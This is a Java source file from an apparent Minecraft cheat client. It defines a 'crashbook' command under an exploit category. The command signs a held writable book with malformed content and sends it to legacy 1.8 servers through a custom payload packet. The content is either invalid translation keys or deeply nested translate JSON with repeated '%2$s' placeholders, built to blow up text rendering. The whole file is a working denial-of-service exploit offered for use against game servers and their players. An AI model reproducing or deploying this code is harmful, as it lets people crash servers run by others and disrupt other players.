/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.exploit;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import de.nekosarekawaii.vandalism.feature.command.Command;
import de.nekosarekawaii.vandalism.integration.ViaFabricPlusAccess;
import de.nekosarekawaii.vandalism.util.ChatUtil;
import net.minecraft.command.CommandSource;
import net.minecraft.item.Items;
import net.minecraft.registry.DynamicRegistryManager;
import net.minecraft.text.Text;
import net.raphimc.vialoader.util.VersionRange;

import java.util.List;

public class CrashBookCommand extends Command {

    public CrashBookCommand() {
        super(
                "Turns a writable book from your hand into an crash book even in survival.",
                Category.EXPLOIT,
                VersionRange.single(ProtocolVersion.v1_8),
                "crashbook",
                "book"
        );
    }

    @Override
    public void build(final LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("invalid-translation").then(argument("title", StringArgumentType.greedyString()).executes(context -> {
            if (!check()) return SINGLE_SUCCESS;
            final String title = StringArgumentType.getString(context, "title");
            this.sendBookPacket(title, Text.Serialization.toJsonString(Text.translatable("translation.test.invalid"), DynamicRegistryManager.EMPTY));
            return SINGLE_SUCCESS;
        })));
        builder.then(literal("invalid-translation-2").then(argument("title", StringArgumentType.greedyString()).executes(context -> {
            if (!check()) return SINGLE_SUCCESS;
            final String title = StringArgumentType.getString(context, "title");
            this.sendBookPacket(title, Text.Serialization.toJsonString(Text.translatable("translation.test.invalid2"), DynamicRegistryManager.EMPTY));
            return SINGLE_SUCCESS;
        })));
        builder.then(literal("long-translation").then(argument("size", IntegerArgumentType.integer(1, 40)).then(argument("title", StringArgumentType.greedyString()).executes(context -> {
            if (!check()) return SINGLE_SUCCESS;
            final String title = StringArgumentType.getString(context, "title");
            final int repetitions = IntegerArgumentType.getInteger(context, "size");
            final StringBuilder jsonBuilder = new StringBuilder("{\"translate\":\"");
            jsonBuilder.append("%2$s".repeat(repetitions));
            jsonBuilder.append("\",\"with\":[\"\"");
            for (int i = 0; i < repetitions; i++) {
                jsonBuilder.append(",{\"translate\":\"");
                jsonBuilder.append("%2$s".repeat(repetitions));
                jsonBuilder.append("\",\"with\":[\"\"");
            }
            jsonBuilder.append(",{\"translate\":\"");
            jsonBuilder.append("%2$s".repeat(repetitions));
            jsonBuilder.append("\",\"with\":[\"txsla\", \"txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_\"]}]}");
            jsonBuilder.append("]}".repeat(repetitions));
            this.sendBookPacket(title, jsonBuilder.toString());
            return SINGLE_SUCCESS;
        }))));
    }

    private boolean check() {
        if (!this.mc.player.isHolding(Items.WRITABLE_BOOK)) {
            ChatUtil.errorChatMessage("You need to hold a writable book in your hand.");
            return false;
        }
        return true;
    }

    private void sendBookPacket(final String title, final String json) {
        ViaFabricPlusAccess.send1_8CustomPayload(
                "MC|BSign",
                ViaFabricPlusAccess.create1_8Book(
                        title,
                        "UwU",
                        true,
                        true,
                        List.of(json)
                )
        );
    }

}
